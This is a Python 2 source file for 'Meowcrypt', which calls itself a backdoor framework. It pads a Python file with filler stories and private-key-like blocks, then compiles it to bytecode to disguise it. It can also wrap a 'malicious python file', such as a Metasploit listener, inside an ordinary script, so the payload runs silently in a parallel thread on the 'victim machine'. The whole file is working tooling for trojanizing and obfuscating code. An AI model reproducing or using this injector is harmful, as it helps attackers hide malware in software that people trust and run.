#!/usr/bin/python
#! coding : utf-8
#! python : 2.7
#! code by meowtonkalava

"""

Usage :

# encrypt a python file

python Meowcrypt.py --file=filetoencrypt.py
python Meowcrypt.py --file=filetoencrypt.py --output=output_file.py

# inject a malicious python file into a normal python file

python Meowcrypt --file=normal_file.py --backdoor-file=msf_listener.py --output=test.py


/* when you will execute the file 'test.py' the file 'file.py' will be executed in the same time with
 the file 'listen.py' with multi-threading system */

"""

# modules

import sys
import py_compile
import optparse
import os
import commands
import time
import random
import string




error = '\033[37;41m'
error1 = '\033[1;m'

sucess = '\033[32m'
sucess1 = '\033[37m'

troll = ['\033[1;36m','\033[1;34m','\033[1;33m']

colored = random.choice(troll)

text = """

'''
hey guys, im meowtonkala who created meowcrypt.
today, i will tell you story
I am lonely. I am always by myself. I meet people every day. 
I smile at them. I say hello. I am nice to them. 
I want to have a friend. But I have no friends. What is wrong with me? I am polite. I am friendly. I am nice. I am kind. Why don't people like me? All I want is one friend. Everyone has one friend. I always see people with their friends. They laugh with each other. They have fun with each other. They do things with each other. What about me? I am by myself. I watch TV by myself. I go to movies by myself. I go to restaurants by myself. I go to the park by myself. I told my mother that I am lonely. She said it is my fault. "Why?" I asked. She said, "Because you never ask anyone to be with you." My mom is right. 
I never ask people to be with me. I am afraid they will say no.
 A Baby and a Sock
The mother gave her baby a red apple. The baby tried to eat the apple. His mouth was too small. And he didn't have any teeth. His brother took the apple. His brother ate the apple. The baby cried. His brother gave the baby a blue ball to play with. The baby smiled. His brother took the ball from the baby. He rolled the ball on the floor. The brown and white dog picked up the ball. The dog chewed on the ball. The baby cried again. His brother picked up the cat. He put the cat on the bed with the baby. The baby pulled the cat's tail. The cat jumped off the bed. The dog chased the cat. The baby cried again. His brother let the baby hold a sock. The baby played with the sock. The baby was happy.
 Birds and a Baby
The baby was lying on her back. A blue bird flew in through the window. The blue bird had blue eyes. It sat on the baby's crib. The bird had a bell around its neck. The bell rang. The baby smiled. The baby reached for the bell. The bird shook its head. The bell fell off the bird's neck. It fell next to the baby. The baby picked up the bell. The baby rang the bell. Another blue bird flew in through the window. This blue bird also had blue eyes. The baby had brown eyes. The birds looked at the baby. The baby looked at the birds. The baby rang the bell again. Both birds flew away. The baby started to cry. His mama came into the room. The baby smiled. Mama saw the bell. She asked the baby where the bell came from. The baby pointed at the window.
 A Cat and a Dog
The black cat jumped up onto the chair. It looked down at the white dog. The dog was chewing on a bone. The cat jumped onto the dog. The dog kept chewing the bone. The cat played with the dog's tail. The dog kept chewing the bone. The cat jumped back onto the chair. It started licking its paws. The dog stood up. It looked at the cat. It licked the cat's fur. The cat licked the dog's nose. The dog went back to its bone. A boy ran through the room. He was wearing a yellow shirt. He almost ran into the chair. The cat jumped off the chair. The cat jumped onto the sofa. The chair fell onto the floor next to the dog. The dog stopped chewing the bone. The dog chased the boy. The boy ran out to the street. He threw a stick. The dog chased the stick. The dog lay down. It chewed on the stick.
 The Baby Bear
The baby bear followed his mama. Mama bear walked through the woods. She was looking for berries to eat. She found some black berries. She started eating them. The baby started eating them, too. They ate all the berries. Baby bear was full. Mama bear was still hungry. She started walking again. She wanted to find more berries to eat. Baby bear lay down. He was full. He wanted to take a nap. But mama bear came back. She growled at baby bear. He understood mama's growl. When mama growled, he obeyed. He got up and followed his mama. Someday he would take a nap after a meal. A squirrel ran up a tree with a nut. It dropped the nut and ran back down to the ground. It picked up the nut and looked at baby bear. Then it ran back up the tree. Baby bear did not like nuts. They were too hard to open.

 An Apple Pie
The tree was full of red apples. The farmer was riding his brown horse. He stopped under the tree. He reached out and picked an apple off a branch. He bit into the raw apple. He enjoyed the apple. His horse turned its head to look at him. The farmer picked another apple off the tree. He gave it to the horse. The horse ate the raw apple. The horse enjoyed the apple. The farmer put a dozen apples into a bag. He rode the horse back home. He put the horse in the barn. He walked into his house. The cat rubbed up against his leg. He gave the cat a bowl of warm milk. He sat down on the sofa. He opened a book to read. His wife came home. She cooked the raw apples. She made an apple pie. They ate bread and hot soup for dinner. They enjoyed the bread and soup. They had hot apple pie for dessert. They both enjoyed the apple pie.

 The Top Bunk
He and his brother slept in a bunk bed. He had the bottom bunk. His brother had the top bunk. The top bunk had a guard rail. The rail kept the sleeper safe. His brother didn't like the rail. He always left it down. One time his brother fell out of the top bunk. He hit the carpet and woke up. He said, "Ouch!" Then he climbed back into the top bunk. When he woke up the next day, his back was sore. Mom took him to see the doctor. The doctor examined him. The doctor said he was okay. He said to keep the guard rail up. His brother said he would do that. That night his brother climbed into the top bunk again. He left the guard rail down. He said the guard rail was like jail. He didn't want to feel like he was in jail. He fell asleep. Then he fell out of the top bunk again.
 Ask Santa
It is December. That means it is Christmas time. Christmas time means Santa Claus is coming. Sara and Billy love Christmas. They love Santa Claus. They love the gifts from Santa. Last year they got nice gifts. Sara got a teddy bear and a rubber duck. Billy got a green boat and a rubber duck. The rubber ducks float. When Sara takes a bath, her pink duck floats in the water. When Billy takes a bath, his blue duck floats in the water. One time Billy put a goldfish into the tub. It swam for a while. Then it died. He buried it in the back yard. He was sad. This year Sara and Billy want bicycles. Sara wants a red bike. Billy wants a blue bike. Mama said she would talk to daddy. Sara asked mama, "Why don't you talk to Santa?" Mama said, "That's a good idea. When daddy comes home, he and I will talk to Santa."
 A Birthday Bike
January 7 is Benny's birthday. He will be eight years old. He is in the third grade. He goes to Park Elementary School. An elementary school is for kids. It is only one mile away. He walks to school. It only takes 20 minutes. When it rains, he wears a raincoat. He used to take an umbrella. But he lost the umbrella. His mother gave him another umbrella. He broke that one. His mom said, "You and umbrellas don't get along." For his eighth birthday, Benny wants a bicycle. He can ride the bike to school. After school he can ride with his friends. He can ride the bike to the swimming pool. He can ride the bike to the library. His mom and dad took him to the bike store. They asked him to look at the bikes. He looked at all the bikes. He chose a red bike. He showed his parents. Dad said it cost too much. He told Benny to choose another bike. Benny chose a blue bike. Dad said the blue bike was the right price.

 In the Garden
Mama was in the garden. "What are you doing?" Johnny asked. She said she was planting roses. Roses are flowers. They are very pretty. They are usually red. Roses have thorns. His mama said, "Thorns will stick you. Be careful around thorns." Johnny went to the front yard. His dog Rex was waiting for him. Johnny picked up a stick and threw it. Rex chased the stick. He brought the stick back. Johnny ran around the house. Rex chased him. Johnny ran through the garden. Rex ran through the garden. Mom yelled at Johnny and Rex. She told them to play somewhere else. She told them to stay out of the garden. Johnny apologized to his mom. He went to the garage and got his bike. He went for a bike ride. Rex ran next to the bike.

 Today's Mail
The mailman put the mail in the mailbox. Dad went outside. He said hello to the mailman. The mailman said hello. Dad opened the mailbox and took out a magazine and two letters. One letter was from his sister. The other letter was from his brother. The magazine was for his wife. It was a garden magazine. His wife liked to work in the garden. She grew flowers and vegetables in the garden. Dad went back into the house. He opened both letters. His sister invited him to a birthday party. His brother invited him to a wedding. Dad enjoyed reading the letters. He enjoyed getting the invitations. He picked up the phone. He left a message for his sister. He would come to the birthday party. He also called his brother. He said he would come to the wedding.

 Boys Will Be Boys
The two brothers loved each other. But sometimes they argued with each other. Sometimes they yelled at each other. Sometimes they pushed each other. Sometimes they hit each other. Sometimes they got into a fight with each other. Bobby was the older brother. Billy was the younger brother. Bobby was older than Billy. Billy was younger than Bobby. Bobby climbed into a tree. His kite was in the tree. He could not reach his kite. He fell out of the tree. Billy laughed. He laughed when he saw Bobby fall to the ground. Bobby was not hurt. But he was angry. "Why are you laughing?" he asked Billy. "That was funny!" Billy said. Bobby said it wasn't funny. Billy said it was funny. Bobby pushed Billy. Billy pushed Bobby. Bobby punched Billy in the stomach. Billy punched Bobby in the stomach. They put their arms around each other. They wrestled on the ground. They rolled around and around. Their mom came outside. "What are you two doing?" she asked. She separated them. She said, "You shouldn't hit each other. That's not nice. Wait till your father gets home." She sent them to their rooms.

 A Good Meal
The children were hungry. They looked out the window. Where was their mother? She walked into the house. The children ran over to her. "Mama, we're so hungry," they both said. She said lunch was coming. She walked into the kitchen. She opened a can of chicken soup. She poured the soup into a pot. She added water. She put the pot on the stove. She made two peanut butter and jelly sandwiches. She sliced an apple. The soup was hot. She poured it into two bowls. She put the sandwiches on two plates. She put apple slices on each plate. She put the bowls and plates on the table. The children ran to the table. "Thank you, mommy!" they said. Then they started eating. The cat and the dog watched them eat.

 No Food, No Job
I am an adult. I'm not a kid. I'm a grown-up. I need some money. I have no food. I am hungry. I am not thirsty, because water is everywhere. But water has no taste. I want to drink a soda. I want to drink milk. I want to drink coffee. I want to work. Nobody will hire me. Nobody is hiring anybody. Companies are firing people. Companies are laying off people. Everyone is looking for a job. I cannot pay my rent. I will have to live in my car. I don't want to live in my car. My car has no bed. Everyone should live in a house or an apartment. Many people don't have a car. They live on the street. A street has no bed. Nobody should live on the street. I don't know what to do. I don't know where to go. Maybe I will go to church. Maybe I will find help there.

 New Shoes
She is young. Her shoes are old. She wears them to work. She goes to work five days a week. She loves her work. She is a waitress. She works at a restaurant. The restaurant is near her home. She walks to the restaurant. She stands up all day long. She is young and strong. But her shoes are not. They are old. She saw an ad in the paper. All shoes were on sale at the shoe store. She walked into the store. She looked around. She saw some black shoes. They looked good. She tried them on. They were very comfortable. They felt good. They were only $25. She paid cash. She wore them home. She felt good. She was ready for work the next day.

'''

"""

lorem = """

'''
Hey guys, ego Meowtonkala, qui creavit Meowcrypt.
Et vos hodie fabulam narrare
Im 'solus. Im 'semper solus. Et populum obviam quotidie.
Itaque ut ridens. Dico salve. Ego amica cum illis.
Volo enim ut amicus amicos, quam Sed non de me? Et eruditus sum, ego sum amica amica est. Quare qui non vis? Volo omnes amici. Omnes homines vident apud suos semper amicus est. Se rident. Habent inter tellus. Eos agunt. Quid de me? Im 'solus. Non solum vigilate TV. Et ite ad movies solus. Et cauponae ire solum. Parco autem solus ire. Mihi mater mea, quod solus ego sum. Dixit esset culpa mei. "Quid?" Rogavi. Et dixit: "Et quis umquam ad te peto." Mea mater est
Ego quaeritur qui non est mecum. Non timet dicere.
A puer et mediis soccus
Ei infantem mater est pupillam rubrum. Conatus infantem comedere pomum. Angustus est ore suo. Ehhh, quod sine dentibus est. Frater eius mala. Pomi fratrem. Inquit infantem. Frater eius dederunt hyacinthum et infantem ludere pila. Infantem protulit. Fratrem infantem sustulit pila. Et advolvit in area pila. Et sustulerunt globus canis fuscis. Nec defecerat hujuscemodi canis pila. Et iterum inquit infantem. Sustulerunt fratris felis. Et pone infantem in felem in lecto. Et extraxerunt infantem scriptor cattus cauda. A cattus laetabundus de lecto. Canis in urbem conpulit cecideruntque cattus. Et iterum inquit infantem. Et fratribus suis infantem soccum ineunt. Puer in psallebat in mediis soccus. Infantem fuisse felicem.
Et volucres infans
Infans iacebat in tergum ejus. A hyacintho avis volans ex fenestram. Caeruleis oculis caesiis ales. Et sedit super infantem scriptor præsepe. Quod campane avis est circa collum ejus. Et campana insonuit. Infantem protulit. Quod campane infantem pervenit. Avis et quassat caput. Quod campane cecidit super collum avium s. Qui ceciderunt iuxta infantem. Et sustulit infantem cucullo. Puer insonuit campana. Alius avis volans caerula ex fenestram. Haec avis et hyacintho hyacintho oculos habebat. Brunneis oculos infans. Et volucres respexit ad infantem. Respexit ad infantem aves. Tinniant infantem cum adhuc bell. Tum aves volaverunt. Infantem coepit maerere an imperes. Et ingressus est cubiculum matrem suam. Infantem protulit. Mom vidit bell. Et interrogavit infantem, ubi venit de bell. Infantem in servitio dicare velint ad fenestram.
A cattus et canis
Nigrum cattus exiliens stetit et in cathedra onto. Respexit ad canis. Canis est super os mandendo. A cattus exiliens stetit super canem. Canis os commanducata. Quod esset cattus scriptor canum ludens cum cauda. Canis os commanducata. A cattus descenderunt in iugum evaserat. Et ea qua incedunt quadrupedia coepi capreis naturam ligurire. Canis resurrexit. Aspexit felis. Et lingebant ulcera in cute quod cattus. Et lingebant ulcera cattus scriptor canis nasum. Canis os suum rediit. A trans puerum cucurrit in locus. Shirt et petasos flavos gerunt. Et cucurrit ad sellam. A cattus exiliens stetit et in cathedra. A cattus exiliens stetit reuoluta toro. Cecidit super sellam in area iuxta canem. Canis os obstruatur, rememorando secum. Persecutique sunt pueri canis. In viam cucurrit puer. Qui depositos proiecerunt in lignum unum. Canis urbem conpulit cecideruntque in lignum unum. Canis iacebat. Ad quorum plagas et baculus.
infantem Ursus
Infantem ursus matrem sequitur. Sanctus Ursus silvam perambulabat. Illa quaero olivarum manducare. Invenit quidam niger bacas. Coepit manducare eos. Infantem coepit manducare nimis. Comederunt omnia facere. Infantem ursus erat. Ursus mama esuriem. Et iterum coepi ambulans. Illa volui ut manducare magis facere. Hodie lectum portare. Et erat. Et voluerunt accipere a conquiescamus. Ursus mama rediit. Et gemuit: et infantem ursus. Mom cognovit vocem. Datum cum remigibus grunnisse Elpenora, et oboedientissime paruit. Qui surrexit, et secutus est eam matrem suam. Ego aliquando conquiescamus post prandium accipies. Sciuro blandius finita lignum quod cum nut. Đã bị B. qua và chaj lại thành phần. Accepit puerum respexit nucis sustinere. Et cucurrit ad arbore. Infantem parere noluit nuces. Aperta sunt difficilia.

pie Lacus
De ligno autem erat plena rubrum habeo. Equum et ascensorem agricolae fuscis. Constitit sub arbore. Extenditque manum, et tulit et malum ex genere. Qui in rudis pomum mordens. Qui pupillam fruendum. Convertit ad equum respicere. Agricola elegit alterius arboris pomum. Equitibus dedit. Equum crudas pomum. Malus usus equorum. Agricola a dozen apples puts in lapides sacculi. Hinc equitavit equum reversus in domum suam. Horreo posuit equum. Et ingressus domum suam. Et ipse crus cattus fricatur. Et dedit feles patera calidum lac ex. Et sedit super lectum. Et aperuit librum legere. Et venit in domum suam uxorem. Et assaverunt rudis tritici vallatus liliis. Illa pie fecit malum. Panem non comedit, et calida pulmenti prandium. Et accepto pane et lentis ad fruendum. Erat calidum et crustulam malum pro secunda mensa. ambo frui


'''

"""

rsa = """

'''

MIICWgIBAAKBgHbARCDwIVdzyxi3I36sz1hFP3Rkz+Ac0AaP1kINmCcGuKsFd0K3
UwF7pwmi6uW2Sbyxuqay3zVu9baVOibsAMFMVbDRNGr0KoQTpRcEYBjOf32tovof
OSjMnV/at0PdnEVNmW1/55GtdS0Df+dSJA9Otx6O0w1ZSxz9KlSVzr0HAgMBAAEC
gYAs0iTkyb3L5Eij63vaNB+OkZSBugs766QY1fFovPjQwhixdD6vT8JkrOc/G97N
FSB/uBVbFehpopfbcjeguTMPPr7LwJbzwn4xD9u0AotzcO6JnB0k/D1Ixn3IYOY0
o0wmKCq/4Gq6pzsjpJFTG6c5kCszMyQDbMmBWQmeM6ESAQJBALDWs4C07Rw/riCc
KmlG1jtp9x1Uc8zfAlE9FXcdnfidYy/LUhpLtdZNZrHBZ+/P/LbX3kHQijXD7avd
E3MP5NkCQQCr6NuKbRD0NnkTBuWrVPnAxBzO1E8VZF1rFKDXB7UHwtejwcUs3iUt
CTGfr1l+3kj+0aNXCTvDBYxaIUxsmwTfAkAsxpA43JbU+kLKuv/6HBeOf6w0Xvfb
PfRGQaM3v+YJ10AQD/k/8z+dfYetJn18uTsRyOLb40O7jVqWk6mjDrkxAkA5eNHc
x3XBj2yO1eF2lCQjM+1FoGkIB9PLdswG14bIH3WkQ6W9yE65bbdvYVoUNhBFUKTA
9k9KddJkV3mLXZAVAkACHbnraUo727FUodBf48TZkyz6DDOUh4BoJdGq2EDKYWr5
ULGFBeItYZsaSlIc3VtfZdaXcRXRNIjbEOHPLGbb
MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgHbARCDwIVdzyxi3I36sz1hFP3Rk
z+Ac0AaP1kINmCcGuKsFd0K3UwF7pwmi6uW2Sbyxuqay3zVu9baVOibsAMFMVbDR
NGr0KoQTpRcEYBjOf32tovofOSjMnV/at0PdnEVNmW1/55GtdS0Df+dSJA9Otx6O
0w1ZSxz9KlSVzr0HAgMBAAE=

'''

"""


rsa1 = """

'''

MIIEpQIBAAKCAQEAmDmgQAXKaHyTUVf3h/skxS3zVrsdT/8vK9hIl+swQ66sUAqw
ZJDhSX7HposlKgdz6TtVzWLZr/s1m1lJCzCGFbxTHA+w7dsG0qkuhAdZzx1mTHXk
Uhs0sNMq/PsWTGzBJAJvKtqY+/c1IOKKadt5EBxm9RPnK6BAktD+vr9XnNODGjr1
8yqEOmFELHrwpNNKa8NLqxYiCiQV58DE/5NO0V/OqNLlkwR8KNM9BooeTYRG+A3J
2ZfKIrvhFLVXiVRRn/p2ZwB23hFJMT91UOVbvJa5Gpm2RrIe9rUxuF6srD8fnkOU
CJh4FbPJleHZyC7KYOOhAcjPNCu5NI4a5H2oCQIDAQABAoIBAC9FHcUjxzHhFWIa
HeylCUsNtNXG7xhLVtuXoxtB1k/+KtYEK7he4QaQjvDhnp3JiK3xVficbJrgOEpQ
VIVcARc4ztoU6U1DSYAbNy2alsHhEEZICamRdzA9ssiyM79xuhwzgU/eZ8k+f8oB
bxfmJlbhavtJvexnLAYrTh/vjQZOkXomAYSQJya72CfpDxWkiPEOJjBSSib2j9yY
0x5F/M8eVhB48LNvoPvbkW/FsnlJAerKIOYQZQA8NgZkBpCbanVnJ0XT10M68+lT
Wa+8+fZcsSnby6Arkr0MkJdeSJdeAYrWpLoqJyEozhUJvxgtjdIJM81bf2Sl+zJr
WcMIjPECgYEAxh81bnaQ+19V1S0gWaHxQzbnqtwNZ47YrZnB9bkkvrBtYvRR1ev9
170Dt7c0AomyY50mP4efp3ZgJJ2OYWSg0exB6kgblIj89rFQWGJwMQrWoSSqK1Fk
WswFKzfI7qrdnB8Xzvly3lI+alJd2HYSO9xvo8A05ly8/lxVEE/aO20CgYEAxLH3
yMp7X4jGykNN31IJR9TGznPt5BcuFmL+eT6X/EIquRuHLCb6TzDR1OT6LSMWxPqS
dVKx97hH4gT7gDSAPNVGS1NFx+PQMPwzdLIYG/9eW+GyPPRu7SEmEs489V75uTmB
PRFGNwM5M94Khpx8AgmkSHKiDT523t3Thk4dgY0CgYEAvkJKNYJ3SG8NJmLnpiv2
XO3lHBemZ8SuIEiAE1FxEA6tfVHTJPQ0GXHSmCK/N5C0VyUbDfdYQqFTQtZrXOwd
5HpV8n68va+v/dfZqIcf5njaFHX5VRAcp3U1oYM42roLh1n0qzayMP4aIlBm/vCk
IghWzZJPOsnkVQCmT7vffyECgYEAhu9L+9wkPMqZDSKU5nHh2fw3EmRnO0VHoaXx
yv1MyIofwvMGjRyENRVZrYITuilLMoBvPrsnSbiK35vpaO8bViA9Y+lRgqpfJWuu
ZQzUC0jp04CGhNhuzJAkDVycZvvrtsyjQ2B5Wb4FXPajI+twCvnQUL8LOqiyZXup
44XtKfUCgYEAs8DsRxHqL/nu9akH5MWKqxKsH1oeUeMTL0MLkBpJKkLnAu/pSQz9
y41V0jYgz7hO9Voiv1xaFRlXbhP75RzaEwDf5afDDJbsU1jsXMmcXvcAEGUG3s6p
NcPjjBvjld4EM+nuFCY6C62819jmD/jQ2FzA5hMiPne4tGb+JLO5cAg=

'''

"""
stringo = [rsa,rsa1,lorem,text]
_output_ = "backdoor.py" # edit this line is you want edit default output .
_byte_ = (_output_) + "c" # bytecode format

# if platform is linux and Meowcrypt isn't launched  as root
if (sys.platform.startswith("linux")) :
	if (commands.getoutput("whoami")) != "root" :
		print ("run it as root")
		sys.exit() #exit
	else:
		pass
else:
    pass


d = 1
p = random.randint(9,20)


#menu
menu = """

   													  
 @      #  #####  %$^&$#@#
 # %  % #  &      @      !
 #  ##  @  *@##$  #      #        
 @      !  $      @      #
 @      @  @#$%@  @$%^&##@


                            Version 1.1
                                       Codename 'MeoSully'
		(python meowtonBackdoor framework)
note: to run file.py machine victim must install python
	
       """
menu_linux = (colored) + (menu) + (colored)

name = """
------------------------------------------------
MeowtonKalava
	   """

name_linux = "\033[32m" +  (name) + "\033[37m"

#options

parser = optparse.OptionParser()
parser.add_option("--file", "-f", help="python file  ", action="store", dest="file")
parser.add_option("--output", "-o", help="output of python file ", dest="out", action="store")
parser.add_option("--backdoor-file","-b",help="malicious python file to inject into normal file with multi-threading system",action="store",dest="backdoor")

option , arg = parser.parse_args()
if not option.file :

	parser.error("python file hasn't given type --help for help ")
	sys.exit()


# Encryption module

elif  option.file and not option.backdoor :

	print (menu_linux)
	print (name_linux)

	payload = (option.file)
	try:

		didi = open(payload,'r')
		hades = didi.read()
		didi.close()
	except:
		sys.exit(error+"[-] cannot read file '{}'".format(payload)+error1)


	hd = open(payload,'w')
	while (d) != (p) :
		hd.write(random.choice(stringo))
		d += 1
	hd.close()

	albania = open(payload,'a')
	albania.write(hades)
	albania.close()

	india = open(payload,'a')

	d = 1
	p = random.randint(9,20)


	while (d) != (p) :
		india.write(random.choice(stringo))
		d += 1
	india.close()


	if not option.out :
		try:
			py_compile.compile(payload, cfile=_byte_, dfile=None, doraise=False, ) #compilation
		except (py_compile.PyCompileError,IOError,TypeError) :
			sys.exit("encryption error :  file  {} don't exist or it's already crypted  or specify the full path (Ex:/root/backdoor/meowton.py".format(option.file)) #error
		print (sucess+"[*] file : {}".format(option.file)+sucess1)
		print (sucess+"[*] default output : {}".format(_output_)+sucess1)
		if (sys.platform.startswith("linux"))  :
			os.system(" mv  {} {} ".format(_byte_,_output_))

		elif (sys.platform.startswith("windows")) :
			os.system(" rename {} {} ".format(_byte_,_output_))

		elif (sys.platform.startswith("darwin")):
			os.system(" mv {}  {} ".format(_byte_,_output_))

		print (sucess+"[+] encryption finished"+sucess1)
		print (sucess+"[+] file : {} ".format(_output_)+sucess1)
	elif option.out  :
		output = option.out
		bytecode = (option.out) + "c"
		print (sucess+"[*] file : {}".format(option.file)+sucess1)
		print (sucess+"[*] output : {}".format(output)+sucess1)
		try :
			py_compile.compile(payload, cfile=bytecode, dfile=None, doraise=False, ) #compilation
		except (py_compile.PyCompileError,IOError,TypeError) :
			sys.exit("encryption error : file don't exist or it's already crypted  or specify the full path (Ex:/root/backdoor/meowton.py")
		if (sys.platform.startswith("linux")):
			os.system("mv {}  {} ".format(bytecode,output))
		elif (sys.platform.startswith("windows")):
			os.system("rename {}  {} ".format(bytecode,output))
		elif (sys.platform.startswith("darwin")):
			os.system("mv {}  {} ".format(bytecode,output))

		print (sucess+"[+] encryption finished  "+sucess1)
		print (sucess+"[*] file : {} ".format(output)+sucess1)




# Meowton Backdoor

elif (option.backdoor) :

	print (menu_linux)
	print (name_linux)


	if (option.out) :
		_output_ = (option.out)
		time.sleep(2)
		try:
			file_to_write = open(option.file,'r').read()
		except :
			sys.exit(error+"[-] cannot read file {}".format(option.file)+error1)
		try:
			backdoor_to_write = open(option.backdoor,'r').read()
		except :
			sys.exit(error+"[-]) cannot read file {}".format(option.backdoor)+error1)

		hm = open(_output_,'w')
		hm.write("#!/usr/bin/python3\nimport threading\n")
		hm.write("def fcb():\n")
		for lines in (file_to_write.split("\n")) :
			hm.write("\t"+(lines)+"\n")
		hm.write("def rma():\n")
		hm.write("\t"+"try:")
		for haha in (backdoor_to_write.split("\n")):
			hm.write("\t"+"\t"+(haha)+"\n")
		hm.write("\texcept:\n")
		hm.write("\t\tpass\n")
		hm.write("thread_1 = threading.Thread(target=fcb)\n")
		hm.write("thread_2 = threading.Thread(target=rma)\n")
		hm.write("thread_1.start()\n")
		hm.write("thread_2.start()\n")
		hm.close()
		print(sucess+"[meow] File : {}".format(option.file)+sucess1)
		print(sucess+"[meow] Backdoor File : {}".format(option.backdoor)+sucess1)
		print(sucess+"[meow] Injection finished "+sucess1)
		print(sucess+"[meow] Output : {} ".format(_output_)+sucess1)

		question = raw_input(sucess+"[*] Do you want  encrypt (obfuscate) the output [y/n] ? "+sucess1)
		if (question.lower()) == "y" :
			py_compile.compile(_output_, cfile=(_output_)+"c", dfile=None, doraise=False, )
			if (sys.platform.startswith("linux")):
				os.system("mv {}  {} ".format(_output_+"c",_output_))
			elif (sys.platform.startswith("windows")):
				os.system("rename {}  {} ".format(_output_+"c",_output_))
			elif (sys.platform.startswith("darwin")):
				os.system("mv {}  {} ".format(_output_+"c",_output_))
		else:
			pass

		if (sys.platform.startswith("linux")):
			os.system("chmod +x {}".format(_output_))
		else:
			pass

		print(sucess+"[+] Encryption finished "+sucess1)



	elif not (option.out) :
		try:
			file_to_write = open(option.file,'r').read()
		except :
			sys.exit(error+"[-] cannot read file {}".format(option.file)+error1)
		try:
			backdoor_to_write = open(option.backdoor,'r').read()
		except :
			sys.exit(error+"[-] cannot read file {}".format(option.backdoor)+error1)

		test = open(option.file,'r').read()


		if "thread_1.start()" in (test):
			sys.exit(error+"[-] File '{}' is already backdoored ".format(option.file)+error1)

		hm = open(option.file,'w')
		hm.write("#!/usr/bin/python3\nimport threading\n")
		hm.write("def fcb():\n")
		for lines in (file_to_write.split("\n")) :
			hm.write("\t"+(lines)+"\n")
		hm.write("def rma():\n")
		hm.write("\t"+"try:\n")
		for haha in (backdoor_to_write.split("\n")):
			hm.write("\t"+"\t"+(haha)+"\n")
		hm.write("\texcept:\n")
		hm.write("\t\tpass\n")
		hm.write("thread_1 = threading.Thread(target=fcb)\n")
		hm.write("thread_2 = threading.Thread(target=rma)\n")
		hm.write("thread_1.start()\n")
		hm.write("thread_2.start()\n")
		hm.close()
		print(sucess+"[+] File : {}".format(option.file)+sucess1)
		print(sucess+"[+] Backdoor File : {}".format(option.backdoor)+sucess1)
		print(sucess+"[+] Injection finished  "+sucess1)
		question = raw_input(sucess+"Do you want  encrypt (obfuscate) the output [y/n] ? "+sucess1)
		if (question.lower()) == "y" :
			py_compile.compile(option.file, cfile=(option.file)+"c", dfile=None, doraise=False, )
			_output_ = option.file
			if (sys.platform.startswith("linux")):
				os.system("mv {}  {} ".format(_output_+"c",_output_))
			elif (sys.platform.startswith("windows")):
				os.system("rename {}  {} ".format(_output_+"c",_output_))
			elif (sys.platform.startswith("darwin")):
				os.system("mv {}  {} ".format(_output_+"c",_output_))
			else:
				pass
			if (sys.platform.startswith("linux")):
				os.system("chmod +x {}".format(_output_))

			print("[+] Encryption finished ")	
		else:
			pass
else:
	sys.exit()
